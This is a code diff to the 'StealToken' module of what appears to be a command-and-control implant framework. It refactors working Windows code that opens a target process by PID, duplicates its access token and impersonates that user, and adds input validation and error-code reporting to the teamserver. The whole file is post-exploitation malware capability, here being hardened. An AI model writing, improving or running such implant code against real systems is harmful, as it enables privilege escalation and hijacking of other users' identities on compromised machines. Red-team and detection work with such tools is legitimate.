@@ -3,7 +3,6 @@
 #include <cstring>
 
 #include "Common.hpp"
-#include "Tools.hpp"
 
 #ifdef __linux__
 
@@ -72,9 +71,21 @@ int StealToken::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
         int pid=-1;
         try
         {
-            pid = stoi(splitedCmd[1]);
+            size_t consumed = 0;
+            pid = stoi(splitedCmd[1], &consumed);
+            if (consumed != splitedCmd[1].size())
+            {
+                c2Message.set_returnvalue(getInfo());
+                return -1;
+            }
         }
-        catch (const std::invalid_argument& ia) 
+        catch (const std::exception&)
+        {
+            c2Message.set_returnvalue(getInfo());
+            return -1;
+        }
+
+        if (pid <= 0)
         {
             c2Message.set_returnvalue(getInfo());
             return -1;
@@ -97,77 +108,68 @@ int StealToken::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
 
 int StealToken::process(C2Message &c2Message, C2Message &c2RetMessage)
 {
-    int pid = c2Message.pid();
-
-    std::string result = stealToken(pid);
-
-    c2RetMessage.set_instruction(c2RetMessage.instruction());
+    const int pid = c2Message.pid();
+    c2RetMessage.set_instruction(c2Message.instruction());
     c2RetMessage.set_cmd("");
-    c2RetMessage.set_returnvalue(result);
+    c2RetMessage.set_returnvalue("");
+    if (pid <= 0)
+    {
+        c2RetMessage.set_errorCode(1);
+        return 0;
+    }
+#ifdef _WIN32
+    HANDLE processHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, static_cast<DWORD>(pid));
+    if (processHandle == nullptr)
+    {
+        c2RetMessage.set_errorCode(2);
+        return 0;
+    }
+    HANDLE tokenHandle = nullptr;
+    if (!OpenProcessToken(processHandle, TOKEN_DUPLICATE | TOKEN_QUERY, &tokenHandle))
+    {
+        CloseHandle(processHandle);
+        c2RetMessage.set_errorCode(3);
+        return 0;
+    }
+    HANDLE duplicateHandle = nullptr;
+    const BOOL duplicated = DuplicateTokenEx(tokenHandle, TOKEN_IMPERSONATE | TOKEN_QUERY,
+        nullptr, SecurityImpersonation, TokenImpersonation, &duplicateHandle);
+    CloseHandle(tokenHandle);
+    CloseHandle(processHandle);
+    if (!duplicated)
+    {
+        c2RetMessage.set_errorCode(4);
+        return 0;
+    }
+    const BOOL impersonated = ImpersonateLoggedOnUser(duplicateHandle);
+    CloseHandle(duplicateHandle);
+    if (!impersonated)
+    {
+        c2RetMessage.set_errorCode(5);
+        return 0;
+    }
+    c2RetMessage.set_errorCode(0);
+    c2RetMessage.set_returnvalue("Token impersonated successfully.\n");
+#else
+    c2RetMessage.set_errorCode(6);
+#endif
     return 0;
 }
 
-//https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-logonusera
-//https://cpp.hotexamples.com/fr/examples/-/-/LogonUserA/cpp-logonusera-function-examples.html
-//https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-impersonateloggedonuser
-//https://docs.microsoft.com/en-us/windows/win32/secauthz/client-impersonation
-
-std::string StealToken::stealToken(int pid)
+int StealToken::errorCodeToMsg(const C2Message &c2RetMessage, std::string& errorMsg)
 {
-    std::string result;
-
-    if(pid==-1)
+#if defined(BUILD_TEAMSERVER) || defined(C2CORE_BUILD_TESTS)
+    switch (c2RetMessage.errorCode())
     {
-        result+="Incorrect pid\n";
-        return result;
+    case 0: errorMsg.clear(); break;
+    case 1: errorMsg = "Failed: Invalid process ID."; break;
+    case 2: errorMsg = "Failed to open the target process."; break;
+    case 3: errorMsg = "Failed to open the target process token."; break;
+    case 4: errorMsg = "Failed to duplicate the target token."; break;
+    case 5: errorMsg = "Failed to impersonate the target token."; break;
+    case 6: errorMsg = "StealToken is only supported on Windows."; break;
+    default: errorMsg = "StealToken failed with an unknown error."; break;
     }
-
-#ifdef __linux__ 
-
-    result += "StealToken don't work in linux.\n";
-
-#elif _WIN32
-
-    int target = pid;
-
-    HANDLE processHandle;
-    processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(pid));
-
-    HANDLE tokenHandle;
-    // TODO pas besoin de TOKEN_ALL_ACCESS
-    if(OpenProcessToken(processHandle, TOKEN_ALL_ACCESS, &tokenHandle))
-    {
-        HANDLE newToken;
-        // TODO see security attributes
-        if(DuplicateTokenEx(tokenHandle, 0, nullptr, SecurityImpersonation, TokenImpersonation, &newToken))
-        {
-            if(ImpersonateLoggedOnUser(newToken))
-            {
-                result += "Impersonate steal token successfully.\n";
-            }
-            else
-            {
-                result += "Fail to impersonate token.\n";
-            }
-
-            CloseHandle(processHandle);
-            CloseHandle(tokenHandle);
-            CloseHandle(newToken);
-        }
-        else
-        {
-            CloseHandle(processHandle);
-            CloseHandle(tokenHandle);
-            result += "Unable to DuplicateTokenEx.\n";
-        }
-    }
-    else
-    {
-        CloseHandle(processHandle);
-        result += "Unable to OpenProcessToken.\n";
-    }
-
 #endif
-
-    return result;
+    return 0;
 }
